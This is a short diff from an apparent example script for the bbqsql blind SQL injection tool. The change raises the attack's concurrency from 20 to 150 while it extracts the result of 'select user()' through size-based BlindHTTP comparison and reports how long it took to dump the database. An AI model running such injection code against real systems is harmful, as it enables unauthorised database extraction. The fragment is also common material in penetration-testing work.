@@ -37,7 +37,7 @@ query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}
 bh      = bbqsql.BlindHTTP(url=url,query=query,method='GET',comparison_attr='size')
 
 start = time()
-results = bh.run(query="select user()",concurrency=20)
+results = bh.run(query="select user()",concurrency=150)
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
